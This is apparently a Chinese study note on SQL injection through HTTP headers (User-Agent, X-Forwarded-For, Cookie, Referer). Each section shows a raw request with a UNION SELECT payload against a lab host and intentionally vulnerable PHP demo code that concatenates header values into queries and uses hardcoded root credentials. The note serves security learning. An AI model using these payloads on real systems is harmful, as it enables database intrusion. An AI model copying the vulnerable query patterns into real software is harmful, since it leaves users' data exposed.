## UA(User-Agent)

### 对UA设备置顶显示方案

如果是以与数据库交互形式判断前端显示界面有可能存在sql注入

### 对UA设备信息进行记录

存储到数据库中有可能存在insert注入

注入示例

```
GET /php/ua.php HTTP/1.1
Host: 192.168.42.1:9999
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: ' union select 1,2,(database()),4#
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

```

#演示代码

```
<?php

// 数据库连接配置

$servername = "localhost";

$username = "root";

$password = "123456";

$dbname = "user_behavior_db";

  

// 创建数据库连接

$conn = new mysqli($servername, $username, $password, $dbname);

  

// 检查连接是否成功

if ($conn->connect_error) {

    die("数据库连接失败: ". $conn->connect_error);

}

  

// 获取 User - Agent 并进行转义

$user_agent = $_SERVER['HTTP_USER_AGENT'];

  

// 构建 SQL 查询语句

$sql = "SELECT * FROM user_visits WHERE user_agent = '$user_agent'";

#echo $sql;

  

// 执行查询

$result = $conn->query($sql);

  

if ($result->num_rows > 0) {

    $row = $result->fetch_assoc();

    echo $row['user_agent']."<br>";

}

  

// 浏览器判断功能

function get_browser_name($user_agent) {

    if (strpos($user_agent, 'Chrome')!== false) {

        return 'Chrome';

    } elseif (strpos($user_agent, 'Safari')!== false && strpos($user_agent, 'Chrome') === false) {

        return 'Safari';

    } elseif (strpos($user_agent, 'Firefox')!== false) {

        return 'Firefox';

    } elseif (strpos($user_agent, 'MSIE')!== false || strpos($user_agent, 'Trident/')!== false) {

        return 'Internet Explorer';

    } else {

        return 'Unknown';

    }

}

  

$browser = get_browser_name($user_agent);

echo "你使用的浏览器是: ". $browser;

  

// 关闭数据库连接

$conn->close();

?>
```

## XFF(X-Forwarded-For)

 限制IP访问功能能

记录IP访问日志

注入示例

```
POST /php/xff.php HTTP/1.1
Host: 192.168.42.1:9999
Content-Length: 29
Cache-Control: max-age=0
Origin: http://192.168.42.1:9999
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.42.1:9999/php/xff.html
Accept-Encoding: gzip, deflate, br
X-Forwarded-For: 191.168.1.100' union select 1,(database())#
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

username=qiyi&password=123456
```

#演示代码 

```
<?php

// 数据库连接配置

$servername = "localhost";

$username = "root";

$password = "123456";

$dbname = "ip_access_control";

  

// 创建数据库连接

$conn = new mysqli($servername, $username, $password, $dbname);

  

// 检查连接是否成功

if ($conn->connect_error) {

    die("数据库连接失败: ". $conn->connect_error);

}

  

// 获取 X-Forwarded-For 头信息

$xff = $_SERVER['HTTP_X_FORWARDED_FOR']?? null;

  

// 如果 X-Forwarded-For 头存在，取第一个 IP 地址

if ($xff) {

    $client_ip = $xff;

} else {

    // 如果 X-Forwarded-For 头不存在，使用客户端的 IP 地址

    $client_ip = $_SERVER['REMOTE_ADDR'];

}

  

// 构建存在 SQL 注入风险的查询语句

$sql = "SELECT * FROM allowed_ips WHERE ip_address = '$client_ip'";

//echo $client_ip;

//echo $sql;

  

// 执行查询

$result = $conn->query($sql);

  

if ($result->num_rows > 0) {

  

    $row = $result->fetch_assoc();

    echo $row['ip_address']."<br>";

    include('xff.html');

} else {

    header('HTTP/1.1 403 Forbidden');

    echo "你没有权限访问该页面。";

}

  

// 关闭数据库连接

$conn->close();

?>
```

### Cookie

开发人员在编写一个根据用户 ID（存储在Cookie中）来查询信息的功能

注入示例

```
GET /php/cookie.php HTTP/1.1
Host: 192.168.42.1:9999
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Cookie: user_id=-1 union select 1,(database()),3#
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
```

***需要不断测试，测出可以注入的cookie值***

#演示代码

```
<?php

// 数据库连接配置

$servername = "localhost";

$username = "root";

$password = "123456";

$dbname = "user_info_db";

  

// 创建数据库连接

$conn = new mysqli($servername, $username, $password, $dbname);

  

// 检查连接是否成功

if ($conn->connect_error) {

    die("数据库连接失败: ". $conn->connect_error);

}

  

// 从 Cookie 中获取用户 ID

if (isset($_COOKIE['user_id'])) {

    $user_id = $_COOKIE['user_id'];

} else {

    die("未发现存在用户访问。");

}

  

// 构建存在 SQL 注入风险的查询语句

$sql = "SELECT * FROM users WHERE id = $user_id";

  

// 执行查询

$result = $conn->query($sql);

  

if ($result && $result->num_rows > 0) {

    $row = $result->fetch_assoc();

    echo "用户名: ". $row['username']. "<br>";

    echo "邮箱: ". $row['email'];

} else {

    echo "未找到用户信息。";

}

  

// 关闭数据库连接

$conn->close();

?>
```

## Referer

网站期望登录请求来自于本站页面，如果Referer是其他来源，则拒绝登录

注入示例

```
POST /php/referer.php HTTP/1.1
Host: 192.168.42.1:9999
Content-Length: 27
Cache-Control: max-age=0
Origin: http://192.168.42.1:9999
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: ' union select 1,(database())#
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

username=1111&password=1111
```

#演示代码

```
<?php

// 数据库连接配置

$servername = "localhost";

$username = "root";

$password = "123456";

$dbname = "login_demo";

  

// 创建数据库连接

$conn = new mysqli($servername, $username, $password, $dbname);

  

// 检查连接是否成功

if ($conn->connect_error) {

    die("数据库连接失败: ". $conn->connect_error);

}

  

// 获取 Referer 头信息

$referer = $_SERVER['HTTP_REFERER']?? '';

  

// 构建存在 SQL 注入风险的查询语句，检查 Referer 是否允许

$referer_sql = "SELECT * FROM allowed_referers WHERE referer_url = '$referer'";

$referer_result = $conn->query($referer_sql);

  

if ($referer_result->num_rows === 0) {

    die("登录请求来源不合法，拒绝登录。");

}else{

    $row = $referer_result->fetch_assoc();

    echo "来源 ". $row['referer_url']. "<br>";

}

  

// 获取用户输入的用户名和密码

$input_username = $_POST['username'];

$input_password = $_POST['password'];

  

// 构建存在 SQL 注入风险的查询语句，验证用户登录

$login_sql = "SELECT * FROM users WHERE username = '$input_username' AND password = '$input_password'";

$login_result = $conn->query($login_sql);

  

if ($login_result->num_rows > 0) {

    echo "登录成功！欢迎，" . $input_username;

    $row = $login_result->fetch_assoc();

    echo $row['username']. "<br>";

} else {

    echo "用户名或密码错误。";

}

  

// 关闭数据库连接

$conn->close();

?>
```

## 增删改注入

***增删改一般不会对数据库内容进行回显，所以一般用报错注入，盲注较多***

### 报错注入

###### 报错注入语句



## 实例

https://mp.weixin.qq.com/s/_jj0o7BKm8CGEcn77gvdOg
[https://mp.weixin.qq.com/s/_jj0o7BKm8CGEcn77gvdOg](https://mp.weixin.qq.com/s/_jj0o7BKm8CGEcn77gvdOg)
[https://mp.weixin.qq.com/s/_jj0o7BKm8CGEcn77gvdOg](https://mp.weixin.qq.com/s/_jj0o7BKm8CGEcn77gvdOg)
[https://mp.weixin.qq.com/s/t0VH_9qmb1EuwPGiz3Bbcw](https://mp.weixin.qq.com/s/t0VH_9qmb1EuwPGiz3Bbcw)